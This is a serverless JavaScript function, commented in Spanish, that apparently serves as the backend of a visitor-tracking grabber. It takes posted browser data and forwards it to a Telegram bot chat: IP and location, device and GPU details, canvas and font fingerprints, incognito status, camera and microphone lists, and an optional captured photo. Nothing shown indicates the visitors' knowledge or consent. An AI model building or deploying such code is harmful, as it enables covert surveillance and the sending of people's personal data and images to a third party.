exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
      },
      body: ""
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ error: "Method Not Allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");
    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
      };
    }

    function clean(v) {
      if (v === undefined || v === null || v === "") return "N/A";
      return String(v);
    }

    let mensaje = "474747 - Nueva información\n\n";

    mensaje += "Red\n";
    mensaje += "• IP: " + clean(data.ip) + "\n";
    mensaje += "• País: " + clean(data.country) + "\n";
    mensaje += "• Ciudad: " + clean(data.city) + "\n";
    mensaje += "• Región: " + clean(data.region) + "\n";
    mensaje += "• ISP: " + clean(data.isp) + "\n";
    mensaje += "• Conexión: " + clean(data.conexion) + "\n";
    mensaje += "• RTT: " + clean(data.rtt) + "\n\n";

    mensaje += "Dispositivo\n";
    mensaje += "• OS: " + clean(data.os) + "\n";
    mensaje += "• Navegador: " + clean(data.browser) + "\n";
    mensaje += "• Tipo: " + clean(data.device) + "\n";
    mensaje += "• RAM: " + clean(data.ram) + "\n";
    mensaje += "• Núcleos: " + clean(data.nucleos) + "\n";
    mensaje += "• Pantalla: " + clean(data.pantalla) + " (" + clean(data.pixelRatio) + "x)\n";
    mensaje += "• Orientación: " + clean(data.orientacion) + "\n";
    mensaje += "• GPU Vendor: " + clean(data.gpuVendor) + "\n";
    mensaje += "• GPU Renderer: " + clean(data.gpuRenderer) + "\n\n";

    mensaje += "Fingerprints\n";
    mensaje += "• Canvas: " + clean(data.canvasFingerprint) + "\n";
    mensaje += "• Fuentes: " + clean(data.fonts).substring(0, 120) + "\n\n";

    mensaje += "Batería\n";
    mensaje += "• Nivel: " + clean(data.bateria) + "\n";
    mensaje += "• Estado: " + clean(data.cargando) + "\n\n";

    mensaje += "Privacidad\n";
    mensaje += "• Incógnito: " + clean(data.incognito) + "\n";
    mensaje += "• Do Not Track: " + clean(data.doNotTrack) + "\n";
    mensaje += "• Global Privacy Control: " + clean(data.globalPrivacyControl) + "\n\n";

    mensaje += "Media\n";
    mensaje += "• Cámaras: " + clean(data.cameras) + "\n";
    mensaje += "• Micrófonos: " + clean(data.mics) + "\n";
    mensaje += "• Altavoces: " + clean(data.speakers) + "\n\n";

    mensaje += "Almacenamiento\n";
    mensaje += "• Cookies: " + clean(data.cookiesEnabled) + "\n";
    mensaje += "• localStorage: " + clean(data.localStorage) + "\n";
    mensaje += "• sessionStorage: " + clean(data.sessionStorage) + "\n\n";

    mensaje += "Otras\n";
    mensaje += "• Táctil: " + clean(data.toque) + " (" + clean(data.maxTouchPoints) + " puntos)\n";
    mensaje += "• History length: " + clean(data.historyLength) + "\n";
    mensaje += "• Memoria JS: " + clean(data.memoryJS) + "\n";
    mensaje += "• Webdriver: " + clean(data.webdriver) + "\n";
    mensaje += "• Vendor: " + clean(data.vendor) + "\n";
    mensaje += "• Referrer: " + clean(data.referrer) + "\n";
    mensaje += "• Idioma: " + clean(data.idioma) + "\n";
    mensaje += "• Zona: " + clean(data.zonaHoraria) + "\n\n";

    mensaje += new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" });

    // Enviar texto
    const msgRes = await fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    const msgResult = await msgRes.json();
    if (!msgRes.ok) {
      console.error("Error texto:", msgResult);
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Error de Telegram", details: msgResult })
      };
    }

    // Si hay foto, enviarla
    if (data.foto && typeof data.foto === "string" && data.foto.startsWith("data:image")) {
      try {
        const base64Data = data.foto.replace(/^data:image\/\w+;base64,/, "");
        const photoBuffer = Buffer.from(base64Data, "base64");

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption", "Foto - 474747");
        form.append("photo", new Blob([photoBuffer], { type: "image/jpeg" }), "foto.jpg");

        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
          method: "POST",
          body: form
        });
      } catch (photoErr) {
        console.error("Error foto:", photoErr);
      }
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      },
      body: JSON.stringify({ success: true, message: "Enviado correctamente" })
    };

  } catch (error) {
    console.error("Error general:", error);
    return {
      statusCode: 500,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
